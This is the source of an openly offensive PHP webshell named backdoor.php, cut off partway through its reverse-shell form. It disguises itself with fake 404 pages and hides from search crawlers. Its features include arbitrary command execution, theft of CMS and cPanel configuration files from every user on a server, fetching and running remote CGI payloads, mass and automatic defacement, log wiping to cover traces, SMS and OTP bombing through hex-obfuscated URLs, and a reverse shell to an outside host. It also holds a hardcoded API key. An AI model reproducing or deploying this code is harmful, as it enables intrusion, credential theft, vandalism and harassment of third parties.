<?php
/*
 * backdoor.php
 *
 * Copyright 2018 Cvar1984 <Cvar1984@P22DX>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.9
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 *
*/
session_start();
set_time_limit(0);
ignore_user_abort(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '999999999M');
ini_set('zlib.output_compression', 'Off');
ini_restore('safe_mode');
ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("open_basedir");

$auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
$email = ""; // Your Email For Activate Logger

if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
	$sep = substr('\\', 0, 1);
	$os = "Windows";
}
else {
	$sep = '/';
	$os = "Linux";
}

if (!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array(
		"Googlebot",
		"DuckDuckBot",
		"Baiduspider",
		"Exabot",
		"SimplePie",
		"Curl",
		"OkHttp",
		"SiteLockSpider",
		"BLEXBot",
		"ScoutJet",
		"AdsBot Google Mobile",
		"Googlebot Mobile",
		"MJ12bot",
		"Slurp",
		"MSNBot",
		"PycURL",
		"facebookexternalhit",
		"facebot",
		"ia_archiver",
		"crawler",
		"YandexBot",
		"Rambler",
		"Yahoo! Slurp",
		"YahooSeeker",
		"bingbot"
	);
	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Not Found');
		exit();
	}
}

function login_shell() {
?>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL <?php echo $_SERVER['PHP_SELF']; ?> was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<?php
	exit();
}
if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
	if (empty($auth_pass) or (isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass)) {
		$_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ] = true;
		if(!function_exists('file_get_contents')) {
			echo "<script>alert('file_get_contents function disabled, this webshell not working properly')</script>";
		}
		if(!function_exists('file_put_contents')) {
			echo "<script>alert('file_put_contents function disabled, this webshell not working properly')</script>";
		}
		if(!empty($email)) {
			@mail($email, "Logs", "URL : http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."\n\nIP : ".$_SERVER['REMOTE_ADDR']."\n\nPassword : ".$auth_pass."\n\nBy Cvar1984", "From:Cvar1984");
		}
	}
	else {
		login_shell();
	}
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Backdoor</title>
	<!-- CSS STYLE-->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<link rel="shortcut icon" href="https://cvar1984.github.io/favicon.png" />
	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js" type="text/javascript"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
	<style type='text/css'>
	body {
		background: black;
		color: lavender;
		text-shadow: 2px 2px 4px #000000;
		background: url(https://cvar1984.github.io/bg-2.jpg) no-repeat center center fixed;
		-webkit-background-size: cover;
		-moz-background-size: cover;
		-o-background-size: cover;
		background-size: cover;
	}

	@font-face {
		font-family: 'Orbitron';
		font-style: normal;
		font-weight: 700;
		src: local('Orbitron Bold'), local('Orbitron-Bold'),
		url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
		unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
		U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
		U+2212, U+2215, U+FEFF, U+FFFD;
	}

	li {
		display: inline;
		text-shadow: 2px 2px 4px #000000;
		font-size: 17px;
	}

	a {
		color: lime;
	}

	a:hover {
		color: black;
	}

	table,
	tr,
	td {
		border: 1px;
		-webkit-border: 1px;
		-moz-border: 1px;
		-o-border: 1px;
	}

	table {
		-webkit-width:800px;
		-moz-width:800px;
		-o-width:800px;
		-webkit-height:auto;
		-moz-height:auto;
		-o-height:auto;
		width:800px;
		height:auto;
	}

	nav {

	}

	.table-hover {
		border: 1px solid green;
		cellpadding: 3;
		cellspacing: 3;
		font-size: 15px;
	}

	#textarea {
		background: url(https://cvar1984.github.io/textarea-bg.jpg) no-repeat center center fixed;
		-webkit-background-size: cover;
		-moz-background-size: cover;
		-o-background-size: cover;
		background-size: cover;
		width: 1066px;
		height: 500px;
		font-family: Arial, Helvetica, monospace;
		border: 1px solid lime;
	}

	#input {
		background: transparent;
		width: 250px;
		font-family: Arial, Helvetica, monospace;
		color: lavender;
		border: 1px solid lime;
	}

	#menu {}

	* {
		font-family: 'Orbitron';
	}

	.icon {
		width: 20px;
		height: 20px;
	}
	.iframe {
		-webkit-width: 100vw;
		-moz-width: 100vw;
		-o-width: 100vw;
		width: 100vw;
		height: 100vh;
		position: relative;
	}
	span {
		color:red;
	}
	</style>
</head>
<body>
<?php
// FUNCTION
function post_data($url, $data)
{
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	return curl_exec($ch);
	curl_close($ch);
}

function home() {
	echo "<script>window.location='?';</script>";
}

function hapus($dir)
{
	if (is_dir($dir)) {
		$objects = scandir($dir);
		foreach ($objects as $object) {
			if ($object != "." && $object != "..") {
				if (is_dir($dir . "/" . $object)) {
					hapus($dir . "/" . $object);
				}
				else {
					unlink($dir . "/" . $object);
				}
			}
		}
		if (rmdir($dir)) {
			return true;
		}
		else {
			return false;
		}
	}
	else {
		if (@unlink($dir)) {
			return true;
		}
		else {
			return false;
		}
	}
}

function spamsms() {
?>
<center>
		<h2>Multi Spam SMS</h2>
		<form method="post">
			<textarea name="no" class="form-control" id="textarea"
				placeholder='No HP ex : 888218005037 ' required cols="" rows=""></textarea>
			<br> <input type="submit" name="action" class="btn btn-danger" />
		</form>
	</center>
<?php
	if (isset($_POST['action'])) {
		$no = str_replace(' ', '', $no);
		$no = str_replace("\n\n", "\n", $no);
		$no = explode("\n", $_POST['no']);
		foreach ($no as $on):
			echo "<hr>Calling	 -> " . $on . "<hr>";
			post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70", "msisdn=" . $on . "&accept=call");
		endforeach;
		for ($x = 0;$x < 100;$x++) {
			foreach ($no as $on):
				echo "<hr>Send OTP To -> " . $on . "<hr>";
				post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73", "phone=" . $on . "&smsType=1");
				post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50", "phone_number=" . $on);
			endforeach;
		}
	}
	else {
		die();
	}
	die();
}

function music()
{
	echo "<center>";
	echo "<iframe width='700px' height='500px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
	echo "</center>";
	die();
}

function jumping()
{
	alert("This feature under development");
}

function config()
{
	// grab config by indoXploit (Improved)
	if (!file_exists('.config')) {
		mkdir(".config");
	}
	if (!file_exists('.config/config')) {
		mkdir(".config/config");
	}
	if (!file_exists('.config/config/.htaccess')) {
		$isi = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
		file_put_contents('.config/config/.htaccess', $isi);
	}
	if (preg_match("/vhosts|vhost/", $dir)) {
		$link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
		if (!file_exists('.config/config/vhost.cin')) {
			file_put_contents('.config/config/vhost.cin', gzinflate(urldecode(file_get_contents('https://cvar1984.github.io/vhost.cin'))));
			chmod('.config/config/vhost.cin', 777);
		}

		if (cmd("cd .config/config && ./vhost.cin")) {
			echo "<center><a href='$link_config/.config/config'><font color=lime>Done</font></a></center>";
		}
		else {
			echo "<center><a href='$link_config/.config/config/vhost.cin'><font color=lime>Done</font></a></center>";
		}

	}
	else {
		$etc = @fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
		while ($passwd = fgets($etc)) {
			if ($passwd == "" || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			}
			else {
				preg_match_all('/(.*?):x:/', $passwd, $user_config);
				if(file_exists('/home/')) {
				$home='home';	
				}
				elseif(file_exists('/home1/')) {
				$home='home1';					
				} 
				elseif(file_exists('/home2/')) {
				$home='home2';					
				}
				elseif(file_exists('/home3/')) {
				$home='home3';					
				}
				elseif(file_exists('/home4/')) {
				$home='home4';					
				}
				foreach ($user_config[1] as $user_idx) {
					$user_config_dir = "/$home/$user_idx/public_html";
					if (is_readable($user_config_dir)) {
						$grab_config = array(
							"/$home/$user_idx/.my.cnf" => "cpanel",
							"/$home/$user_idx/.accesshash" => "WHM-accesshash",
							"$user_config_dir/po-content/config.php" => "Popoji",
							"$user_config_dir/vdo_config.php" => "Voodoo",
							"$user_config_dir/bw-configs/config.ini" => "BosWeb",
							"$user_config_dir/config/koneksi.php" => "Lokomedia",
							"$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
							"$user_config_dir/koneksi.php" => "Lokomedia",
							"$user_config_dir/clientarea/configuration.php" => "WHMCS",
							"$user_config_dir/whm/configuration.php" => "WHMCS",
							"$user_config_dir/whmcs/configuration.php" => "WHMCS",
							"$user_config_dir/forum/config.php" => "phpBB",
							"$user_config_dir/sites/default/settings.php" => "Drupal",
							"$user_config_dir/config/settings.inc.php" => "PrestaShop",
							"$user_config_dir/app/etc/local.xml" => "Magento",
							"$user_config_dir/joomla/configuration.php" => "Joomla",
							"$user_config_dir/configuration.php" => "Joomla",
							"$user_config_dir/wp/wp-config.php" => "WordPress",
							"$user_config_dir/wordpress/wp-config.php" => "WordPress",
							"$user_config_dir/wp-config.php" => "WordPress",
							"$user_config_dir/admin/config.php" => "OpenCart",
							"$user_config_dir/slconfig.php" => "Sitelok",
							"$user_config_dir/application/config/database.php" => "Ellislab",
							"$user_config_dir/config/database.php" => "Ellislab",
							"$user_config_dir/models/db-settings.php" => "Usercake",
							"$user_config_dir/config/database.php" => "Laravel",
							"$user_config_dir/database.php" => "Laravel",
							"$user_config_dir/application/config.ini" => "Zend",
							"$user_config_dir/config/app.php" => "CakePHP",
							"$user_config_dir/phalcon/config/adapter/ini.zep" => "Phalcon",
							"$user_config_dir/config/adapter/ini.zep" => "Phalcon",
							"$user_config_dir/app/config/configuration.yml"	=> "Symphony",
							"$user_config_dir/app/config/databases.yml"	=> "Symphony",
							"$user_config_dir/config/configuration.yml"	=> "Symphony",
							"$user_config_dir/config/databases.yml"	=> "Symphony",
							"$user_config_dir/config/db.php" => "FuelPHP & Yii2",
							"$user_config_dir/src/settings.php" => "Slim",
						);
						foreach ($grab_config as $config => $nama_config) {
							$ambil_config = @file_get_contents($config);
							if (!empty($ambil_config)) {
								$file_config = fopen(".config/config/$user_idx-$nama_config.txt", "w");
								fputs($file_config, $ambil_config);
								fclose($file_config);
							}
						}
					}
				}
			}
		}
		echo "<center><a href='?do=open&dir=" . getcwd() . $sep . $dir."/.config/config'>Done</a></center>";
	}
	die();
}

function mass_deface_main()
{
	global $sep;
	$dir=getcwd().$sep;
	function mass_deface($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = mass_deface($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if(isset($_POST['action']) == "Deface") {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			mass_deface($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
	} else {
		?>
	<center><center><h2>Mass Deface</h2></center>
	<form method='post'>
	Folder:<br>
	<input type='text' class='input-sm' id='input' name='d_dir' value='<?php echo $dir;?>'><br>
	Filename:<br>
	<input type='text' class='input-sm' id='input' name='d_file' value='index.php'><br>
	Content:<br>
	<textarea type='text' class='form-control' id='textarea' name='script' ><?php echo file_get_contents('https://gist.githubusercontent.com/Cvar1984/3bfdd8d2c09f8889440a9f74f6114a04/raw/899508d80ec7eba573bfb91af082586e26bf71e4/index.php');?></textarea><br>
	<input type='submit' name='action' class='btn btn-danger ' value='Deface' style='width: 450px;'>
	</form></center>
	<?php
	}
	die();
	
}

function info()
{
	if (!ini_get('disable_functions') == true) {
		$dist = "False";
	}
	else {
		$dist = ini_get('disable_functions');
	}
?>
   <center>
   	<h5><?php echo php_uname();?></h5>
   	<h5>Disabled Function : <?php echo $dist;?> </h5>
		<textarea class="form-control" id="textarea" readonly /><?php var_dump($_SERVER);?></textarea>
	</center>
	<?php
	die();
}

function logout()
{
	unset($_SESSION[sha1(md5($_SERVER['HTTP_HOST']))]);
	home();
}

function alert($message)
{
?>
<script type="text/javascript">
var ALERT_TITLE = "Alert";
var ALERT_BUTTON_TEXT = "Ok";
if (document.getElementById) {
	window.alert = function(txt) {
		createCustomAlert(txt);
	}
}

function createCustomAlert(txt) {
	d = document;
	if (d.getElementById("modalContainer")) return;
	mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
	mObj.id = "modalContainer";
	mObj.style.height = d.documentElement.scrollHeight + "px";
	alertObj = mObj.appendChild(d.createElement("div"));
	alertObj.id = "alertBox";
	if (d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
	alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth) / 2 + "px";
	alertObj.style.visiblity = "visible";
	h1 = alertObj.appendChild(d.createElement("h1"));
	h1.appendChild(d.createTextNode(ALERT_TITLE));
	msg = alertObj.appendChild(d.createElement("p"));
	//msg.appendChild(d.createTextNode(txt));
	msg.innerHTML = txt;
	btn = alertObj.appendChild(d.createElement("a"));
	btn.id = "closeBtn";
	btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
	btn.href = "#";
	btn.focus();
	btn.onclick = function() { removeCustomAlert(); return false; }
	alertObj.style.display = "block";
}

function removeCustomAlert()
{
	document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
}
</script>
<style type="text/css">
#modalContainer {
	background-color: rgba(0, 0, 0, 0.3);
	position: absolute;
	width: 100%;
	height: 100%;
	top: 0px;
	left: 0px;
	z-index: 10000;
	/* required by MSIE to prevent actions on lower z-index elements */
}

#alertBox {
	position: relative;
	width: 300px;
	min-height: 100px;
	margin-top: 50px;
	border: 1px solid #666;
	background-color: #fff;
	background-repeat: no-repeat;
	background-position: 20px 30px;
}

#modalContainer>#alertBox {
	position: fixed;
}

#alertBox h1 {
	margin: 0;
	font: bold 0.9em verdana, arial;
	background-color: #3073BB;
	color: #FFF;
	border-bottom: 1px solid #000;
	padding: 2px 0 2px 5px;
}

#alertBox p {
	color: red;
	height: 50px;
	padding-left: 5px;
	margin-left: 55px;
}

#alertBox #closeBtn {
	display: block;
	position: relative;
	margin: 5px auto;
	padding: 7px;
	border: 0 none;
	width: 70px;
	font: 0.7em verdana, arial;
	text-transform: uppercase;
	text-align: center;
	color: #FFF;
	background-color: #357EBD;
	border-radius: 3px;
	text-decoration: none;
}


/* unrelated styles */

#mContainer {
	position: relative;
	width: 600px;
	margin: auto;
	padding: 5px;
	border-top: 2px solid #000;
	border-bottom: 2px solid #000;
	font: 0.7em verdana, arial;
}

h1,
h2 {
	margin: 0;
	padding: 4px;
	font: bold 1.5em verdana;
	border-bottom: 1px solid #000;
}

code {
	font-size: 1.2em;
	color: #069;
}

#credits {
	position: relative;
	margin: 25px auto 0px auto;
	width: 350px;
	font: 0.7em verdana;
	border-top: 1px solid #000;
	border-bottom: 1px solid #000;
	height: 90px;
	padding-top: 4px;
}

#credits img {
	float: left;
	margin: 5px 10px 5px 0px;
	border: 1px solid #000000;
	width: 80px;
	height: 79px;
}

.important {
	background-color: #F5FCC8;
	padding: 2px;
}

.main {
	width: 100%;
	box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px rgba(48, 48, 48, 0.7);
}

.vn-nav ul {
	margin: 0;
	padding: 0;
	list-style-type: none;
	list-style-image: none;
}

.vn-nav li {
	margin-right: 0px;
	display: inline;
}

.vn-nav ul li a {
	text-decoration: none;
	margin: 0px;
	padding: 15px 20px 15px 20px;
	color: #ffffff;
}

.vn-nav li.current-menu-item a {
	color: #fff;
	text-decoration: none;
	background-color: #16a085;
}

.vn-nav li.current_page_item {
	color: #fff;
	text-decoration: none;
	background-color: #16a085;
}

.modalDialog {
	position: fixed;
	font-weight: bold;
	font-family: 'Agency FB';
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgba(0, 0, 0, 0.8);
	z-index: 99999;
	opacity: 0;
	-webkit-transition: opacity 400ms ease-in;
	-moz-transition: opacity 400ms ease-in;
	transition: opacity 400ms ease-in;
	pointer-events: none;
}

.modalDialog:target {
	opacity: 1;
	pointer-events: auto;
}

.modalDialog>div {
	width: 500px;
	height: auto;
	position: relative;
	margin: 5% auto;
	padding: 5px 20px 13px 20px;
	background: #34495e;
	color: #fff;
}

.close {
	background: #2c3e50;
	color: #16a085;
	padding: 5px;
	position: right;
	right: -55px;
	text-align: center;
	top: 0;
	width: auto;
	float: left;
	text-decoration: none;
	font-weight: bold;
}

.close:hover {
	background: #2c3e50;
	color: #e74c3c
}

.vn-green a {
	background: #27ae60;
	padding: 10px;
	color: #fff;
}

.vn-green a:hover {
	color: red;
	background: #21894d;
	text-decoration: none;
}
</style>
<script type="text/javascript">alert(<?php echo "'" . $message . "'"; ?>);</script>
<?php
}

function edit($filename)
{
	if (isset($_POST['text'])) {
		if (file_put_contents($filename, $_POST['text'])) {
			alert("Sucess");
		}
		else {
			alert("Permission Denied");
		}
	}
	$text = file_get_contents($filename);
?>
<form method="post">
		<center>
			<h5>Files Editor : <?php echo $filename; ?></h5>
			<textarea name="text" class="form-control" id="textarea" cols=""
				rows=""><?php echo htmlspecialchars($text); ?></textarea>
			<br> <input type="submit" class="btn btn-danger" />
		</center>
	</form>
<?php
	die();
}

function view($filename)
{
	$filename=base64_encode(file_get_contents($filename));
	echo "<center><img src='data:image/jpeg;base64,$filename'/></center>";
	die();
}

function cmd($cmd) {
	if (function_exists('system')) {
		ob_start();
		@system($cmd);
		$buff = ob_get_contents();
		ob_end_clean();
		return $buff;
	}
	elseif (function_exists('exec')) {
		@exec($cmd, $results);
		$buff = "";
		foreach ($results as $result) {
			$buff .= $result;
		}
		return $buff;
	}
	elseif (function_exists('passthru')) {
		ob_start();
		@passthru($cmd);
		$buff = ob_get_contents();
		ob_end_clean();
		return $buff;
	}
	elseif (function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

function cmd_ui()
{
	echo "<center><h2>Command Line</h2></center>";
	if (isset($_POST['command'])) {
		echo "<center><textarea id='textarea' class='form-control' readonly>" . cmd($_POST['command']) . "</textarea></center>";
	}
?>
<center>
		<form method="post">
			<input type="text" class='input-sm' id='input' style='background-color:black;' name="command" /> <input
				type="submit" class="btn btn-danger" />
		</form>
	</center>
	<form></form>
<?php
	die();
}

function renames($filename)
{
	if (isset($_POST['action'])) {
		if (@rename($filename, $_POST['newname'])) {
			alert("Success");
		}
		else {
			alert("Permission Denied");
		}
		home();
	}
?>
   <form method='post'>
		<center>
			<td>Filename : <input type='text' class='input-sm' id='input'
				value='<?php echo $filename; ?>' name='newname'></td> <input
				type='submit' class='btn btn-danger' name='action' value='rename'>
		</center>
	</form>
	<?php
	die();
}

function chmods($filename)
{
	if (isset($_POST['action'])) {
		if (chmod($filename, $_POST['permission'])) {
			alert("Success");
		}
		else {
			alert("Permission Denied");
		}
		home();
	}
?>
   <form method='post'>
		<center>
			<td>Permission : <input type='text' class='input-sm' id='input'
				value='0755' name='permission'></td> <input type='submit'
				class='btn btn-danger' name='action' value='chmod'>
		</center>
	</form>
	<?php
	die();
}

function clear_logs()
{
	global $os;
	if ($os == 'Linux') {
		@hapus('/tmp/logs');
		@hapus('/root/.ksh_history');
		@hapus('/root/.bash_history');
		@hapus('/root/.bash_logout');
		@hapus('/usr/local/apache/logs');
		@hapus('/usr/local/apache/log');
		@hapus('/var/apache/logs');
		@hapus('/var/apache/log');
		@hapus('/var/run/utmp');
		@hapus('/var/logs');
		@hapus('/var/log');
		@hapus('/var/adm');
		@hapus('/etc/wtmp');
		@hapus('/etc/utmp');
		@hapus('/var/log/lastlog');
		@hapus('/var/log/wtmp');
		@hapus('.config');
		@hapus('error_log');
	}
	else {
		foreach(range('A','Z') as $drive) {
			@hapus($drive.':\xampp\apache\logs\error.log');
			@hapus($drive.':\xampp\apache\logs\access.log');
		}
		@hapus('.config');
	}
	alert("Logs is clear");
}

function cgi_shell()
{
	global $os;
	if ($os == 'Windows') {
		alert("This function not available for Windows server");
	}
	else {
		if (!file_exists('.config')) {
			mkdir('.config');
		}
		if(!(file_exists('.config/cgi.izo') AND file_exists('.config/.htaccess'))) {
			file_put_contents('.config/.htaccess', "AddHandler cgi-script .izo\nOptions -Indexes");
			file_put_contents('.config/cgi.izo', file_get_contents('https://pastebin.com/raw/MUD0EPjb'));
		}
		echo ("<iframe src='.config/cgi.izo' class='iframe' frameborder='0' scrolling='no'></iframe>");
	}
	die();
}

function ngindex()
{
	if (isset($_POST['action'])) {
		$file = file_get_contents('https://gist.githubusercontent.com/Cvar1984/3bfdd8d2c09f8889440a9f74f6114a04/raw/899508d80ec7eba573bfb91af082586e26bf71e4/index.php');
		$file = str_replace('<title>Hacked By Cvar1984</title>', '<title>' . $_POST['title'] . '</title>', $file);
		$file = str_replace('https://cvar1984.github.io/bg.mp3', $_POST['music'], $file);
		$file = str_replace('Just Joke :v', $_POST['alert'], $file);
		$file = str_replace('https://minervagunceleri.files.wordpress.com/2014/08/logo.png', $_POST['images'], $file);
		$file = str_replace('<h1>Hacked By Cvar1984</h1>', '<h1>' . $_POST['content'] . '</h1>', $file);
		$file = str_replace('<h4>This Pain Is Wonderful</h4>', '<h4>' . $_POST['sub_content'] . '</h4>', $file);

		if (file_exists('index.php')) {
			rename('index.php', 'index.php.bak');
			chmod('index.php.bak', '0444');
			if (file_put_contents('index.php', $file)) {
				alert("index.php Defaced");
			}
		}
		elseif (file_exists('index.html')) {
			rename('index.html', 'index.html.bak');
			chmod('index.html.bak', '0444');
			if (file_put_contents('index.html', $file)) {
				alert("index.html Defaced");
			}
		}
		else {
			if (file_put_contents('index.php', $file)) {
				alert("index.php Defaced");
			}
		}
	}
?>
<center><h2>Auto Deface With Backup</h2></center>
<form method='post'>
	<table align="center">
		<tr>
			<td>Title</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='title'></td>
			</tr>
		<tr>
			<td>Alert Message</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='Just Joke :v' name='alert'></td>
			</tr>
		<tr>
			<td>Music Link</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/bg.mp3' name='music'></td>
			</tr>
		<tr>
			<td>Image Link</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/logo.png' name='images'></td>
			</tr>
		<tr>
			<td>Content</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='content'></td>
			</tr>
		<tr>
			<td>Sub Content</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='This Pain Is Wonderful' name='sub_content'></td>
			</tr>
		</table>
		<center>
			<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
		</center>
</form>
	<?php
	die();
}

function short_link()
{
	$mykey="AIzaSyDKvTCsXX3Vipbqyhj3a0JH1D3JYMuB5VM";
	echo "<center><h2>Shortlink Generator</h2></center>";
	if (isset($_POST['action'])) {
		$param = "https://www.googleapis.com/urlshortener/v1/url?key=$mykey";
		$post = array(
			"longUrl" => $_POST['link']
		);

		$jsondata = json_encode($post);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $param);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			"Content-type:application/json"
		));
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $jsondata);
		$response = curl_exec($ch);
		curl_close($ch);
		$json = json_decode($response);
		if (isset($json->error)) {
			echo $json->error->message;
		}
		else {
			echo "<center><textarea id='textarea' class='form-control' readonly>" . $json->id . "</textarea></center>";
		}
	}

?>
<form method='post'>
	<table align="center">
		<tr>
			<td>Link</td>
			<td>:</td>
			<td>
				<input type='text' class='input-sm' id='input' name='link'>
			</td>
		</tr>
	</table>
	<center>
		<br />
		<input type='submit' class='btn btn-danger' name='action'>
	</center>
</form>
<?php
	die();
}

function newdir($dir)
{
	if (@mkdir($dir . '/' . 'new_dir')) {
		alert("Success");
	}
	else {
		alert("Permission Denied Or File Exists");
	}
}

function newfile($file)
{
	if (@touch($file . '/' . 'new_file.php')) {
		alert("Success");
	}
	else {
		alert("Permission Denied Or File Exists");
	}
}

function network()
{
	if(isset($_POST['action'])) {
	$chunk_size = 1400;
	$write_a	= null;
	$error_a	= null;
	$daemon	 = 0;
	$debug	  = 0;
	$ip=$_POST['ip'];
	$port=$_POST['port'];
	function printit($string) {
		global $daemon;
			if(!$daemon) {
				print "$string\n";
			}
		}
		if(function_exists('pcntl_fork')) {
			$pid = pcntl_fork();
			if($pid == -1) {
				printit("ERROR: Can't fork");
				exit(1);
			}
			if($pid) {
				exit(0);
			}
			if(posix_setsid() == -1) {
				printit("Error: Can't setsid()");
				exit(1);
			}
			$daemon = 1;
		} else {
			printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
		}
		chdir("/");
		umask(0);
		$sock = fsockopen($ip, $port, $errno, $errstr, 30);
		if(!$sock) {
			printit("$errstr ($errno)");
			exit(1);
		}
		$descriptorspec = array(
			0 => array(
				"pipe",
				"r"
			),
			1 => array(
				"pipe",
				"w"
			),
			2 => array(
				"pipe",
				"w"
			)
		);
		$process		= proc_open($shell, $descriptorspec, $pipes);
		if(!is_resource($process)) {
			printit("ERROR: Can't spawn shell");
			exit(1);
		}
		stream_set_blocking($pipes[0], 0);
		stream_set_blocking($pipes[1], 0);
		stream_set_blocking($pipes[2], 0);
		stream_set_blocking($sock, 0);
		printit("<font color=yellow>Successfully opened reverse shell to $ip:$port </font>");
		while(1) {
			if(feof($sock)) {
				printit("ERROR: Shell connection terminated");
				break;
			}
			if(feof($pipes[1])) {
				printit("ERROR: Shell process terminated");
				break;
			}
			$read_a			  = array(
				$sock,
				$pipes[1],
				$pipes[2]
			);
			$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
			if(in_array($sock, $read_a)) {
				if($debug)
					printit("SOCK READ");
				$input = fread($sock, $chunk_size);
				if($debug)
					printit("SOCK: $input");
				fwrite($pipes[0], $input);
			}
			if(in_array($pipes[1], $read_a)) {
				if($debug)
					printit("STDOUT READ");
				$input = fread($pipes[1], $chunk_size);
				if($debug)
					printit("STDOUT: $input");
				fwrite($sock, $input);
			}
			if(in_array($pipes[2], $read_a)) {
				if($debug)
					printit("STDERR READ");
				$input = fread($pipes[2], $chunk_size);
				if($debug)
					printit("STDERR: $input");
				fwrite($sock, $input);
			}
		}
		fclose($sock);
		fclose($pipes[0]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);
	} else {
?>
<center>
<h2>Reverse Shell</h2>
<form method='post'>
	<table align="center">
	<tr>
		<td align="center"><input type='text' class='input-sm' id='input' value='0.tcp.ngrok.io' name='ip'/></td>
	</tr>
